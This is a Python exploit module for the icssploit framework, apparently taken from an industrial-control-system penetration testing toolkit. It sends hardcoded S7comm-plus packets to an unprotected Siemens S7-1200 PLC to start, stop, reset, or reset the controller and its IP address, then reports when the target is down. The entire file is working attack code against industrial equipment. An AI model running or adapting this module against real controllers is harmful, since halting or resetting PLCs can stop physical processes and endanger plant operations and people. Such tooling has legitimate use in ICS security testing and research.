from icssploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    mute,
    validators,
)
import socket
import struct
import time

# define packet
cotp_connect_packet = bytes.fromhex('030000231ee00000000100c1020600c2' \
                      '0f53494d415449432d524f4f542d4553c' \
                      '0010a')
start_session_packet = bytes.fromhex('030000dd02f080720100ce31000004ca' \
                       '0000000100000120360000011d000400' \
                       '00000000a1000000d3821f0000a38169' \
                       '00151553657276657253657373696f6e' \
                       '5f31433943333830a3822100152c313a' \
                       '3a3a362e303a3a5443502f4950202d3e' \
                       '20496e74656c2852292050524f2f3130' \
                       '3030204d54204e2e2e2ea38228001500' \
                       'a38229001500a3822a00150e4841434b' \
                       '2d50435f323832333330a3822b000401' \
                       'a3822c001201c9c380a3822d001500a1' \
                       '000000d3817f0000a381690015155375' \
                       '62736372697074696f6e436f6e746169' \
                       '6e6572a2a20000000072010000')
start_cpu_packet = bytes.fromhex('0300004302f0807202003431000004f2' \
                   '0000000f0000038a3400000034019077' \
                   '000803000004e8896900120000000089' \
                   '6a001300896b00040000000000000072' \
                   '020000')
stop_cpu_packet = bytes.fromhex('0300004302f0807202003431000004f2' \
                  '0000000f000003a03400000034019077' \
                  '000801000004e8896900120000000089' \
                  '6a001300896b00040000000000000072' \
                  '020000')
reset_cpu_packet = bytes.fromhex('0300004302f0807202003431000004f2' \
                   '00000092000003a43400000032019d24' \
                   '000804000004e8896900120000000089' \
                   '6a001300896b00040000000000000072' \
                   '020000')
reset_cpu_and_ip_packet = bytes.fromhex('0300004302f0807202003431000004f2' \
                          '0000031f000003c83400000032019d24' \
                          '000803000004e8896900120000000089' \
                          '6a001300896b00040000000000000072' \
                          '020000')


# define other
session = "01c9c380"
host_session = "HACK-PC_882330"


class Exploit(exploits.Exploit):
    __info__ = {
        'name': 'S7-1200 PLC Control',
        'authors': [
            'wenzhe zhu <jtrkid[at]gmail.com>',
        ],
        'description': 'Use S7comm plus command to start/stop/reset plc.'
                       'This Module only work with unprotected PLC',
        'references': [],
        'devices': [
            'Siemens S7-1200 programmable logic controllers (PLCs)',
        ],
    }

    target = exploits.Option('', 'Target address e.g. 192.168.1.1', validators=validators.ipv4)
    port = exploits.Option(102, 'Target Port', validators=validators.integer)
    command = exploits.Option(1, 'Command 0:start plc, 1:stop plc, '
                                 '2: reset plc, 3: reset plc and ip.', validators=validators.integer)
    sock = None

    def start_ctrl(self, payload):
        s = socket.socket()
        s.connect((self.target, self.port))
        s.send(cotp_connect_packet)
        time.sleep(0.2)
        s.recv(1024)
        # get session
        packet = start_session_packet[:165] + bytes.fromhex(session) + start_session_packet[169:]
        packet = packet[:65] + session[1:] + packet[72:140] + host_session + packet[154:]
        s.send(packet)
        rep = s.recv(1024)
        session1 = 896 + struct.unpack('>B', rep[24:25])[0]
        session2 = struct.pack('>L', session1)
        # start_ctrl
        seq = struct.pack('>H', 2)
        payload2 = payload[:18] + seq + session2 + payload[24:]
        s.send(payload2)
        s.recv(1024)
        s.close()

    def exploit(self):
        if self.command == 0:
            print_status("Start plc")
            self.start_ctrl(start_cpu_packet)
        elif self.command == 1:
            print_status("Stop plc")
            self.start_ctrl(stop_cpu_packet)
        elif self.command == 2:
            print_status("reset plc")
            self.start_ctrl(stop_cpu_packet)
            time.sleep(0.5)
            self.start_ctrl(reset_cpu_packet)
        elif self.command == 3:
            print_status("reset plc and ip")
            self.start_ctrl(stop_cpu_packet)
            time.sleep(0.5)
            self.start_ctrl(reset_cpu_and_ip_packet)
        else:
            print_error("Command %s didn't support" % self.command)

    def run(self):
        if self._check_alive():
            print_success("Target is alive")
            print_status("Sending packet to target")
            self.exploit()
            if not self._check_alive():
                print_success("Target is down")
        else:
            print_error("Target is not alive")

    @mute
    # TODO: Add check later
    def check(self):
        pass

    def _check_alive(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target, self.port))
            sock.close()
        except Exception:
            return False
        return True
